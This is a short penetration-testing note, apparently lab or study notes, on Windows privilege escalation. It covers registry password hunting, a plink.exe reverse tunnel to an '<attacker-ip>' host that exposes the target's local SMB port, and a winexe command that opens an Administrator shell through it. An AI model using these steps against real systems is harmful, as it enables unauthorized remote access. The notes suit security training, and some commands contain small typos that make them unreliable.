Use **Password Hunting** in the Registry.

>[!Note] Registry Password Hunting
>Password Hunting in the Registry is usually faster than searching through all files on the system.
>Consider doing it first.

# Plink

Plink Download - [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

In our case the target machine has an open port 445 that is only exposed locally.
In order to access the port from our Kali machine we can use Plink similar to SSH to port forward that port.

1) On the kali machine start an SSH server.
2) Run plink on the target machine (Usage: https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html):
```cmd
plink.exe -l <username> -pw <password> -R 445:127.0.0.1:445 <attacker-ip>
```
3) Now you should be logged in to your kali machine over SSH (might need to hit enter a few times)
4) Check that port 445 is accessible:
```cmd
netstan -ano | grep 445
```

# Winexe

https://www.kali.org/tools/winexe/
Winexe remotely executes commands on Windows NT/2000/XP/2003 systems.

We can run winexe against the forwared port 445:
```cmd
winexe -U Administrator&Welcome1! //127.0.0.1 "cmd.exe"
```
Might need to hit enter a few times to see the prompt.